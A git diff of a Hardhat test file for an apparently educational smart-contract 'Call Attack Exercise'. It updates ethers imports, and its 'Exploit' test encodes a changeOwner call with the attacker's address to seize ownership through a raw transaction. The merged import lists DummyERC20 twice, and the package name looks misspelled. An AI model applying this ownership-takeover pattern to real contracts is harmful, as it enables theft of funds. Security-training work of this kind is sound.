@@ -1,11 +1,9 @@
 import { SignerWithAddress } from '@nomincfoundation/hardhat-ethers/signers';
 import { expect } from 'chai';
-import { utils } from 'ethers-v5';
 import { ethers } from 'hardhat';
-const { provider, deployContract, getSigners, parseEther, keccak256, toUtf8Bytes } = ethers;
+const { provider, deployContract, getSigners, parseEther, keccak256, toUtf8Bytes, Interface } = ethers;
 
-import { BlockSafe, BlockSafeFactory, DummyERC20, RestrictedOwner, UnrestrictedOwner } from '../../../typechain-types';
-import { DummyERC20, RentingLibrary, SecureStore, CryptoKeeper, CryptoKeeperFactory } from '../../../typechain-types';
+import { BlockSafe, BlockSafeFactory, DummyERC20, RestrictedOwner, UnrestrictedOwner, DummyERC20, RentingLibrary, SecureStore, CryptoKeeper, CryptoKeeperFactory } from '../../../typechain-types';
 
 describe('Call Attack Exercise', () => {
   describe('Exercise 1', () => {
@@ -32,7 +30,7 @@ describe('Call Attack Exercise', () => {
     });
 
     it('Exploit', async () => {
-      const iface = new utils.Interface(["function changeOwner(address _newOwner)"]);
+      const iface = new Interface(["function changeOwner(address _newOwner)"]);
       const data = iface.encodeFunctionData(`changeOwner`, [attacker.address]);
       await attacker.sendTransaction({
         from: attacker.address,
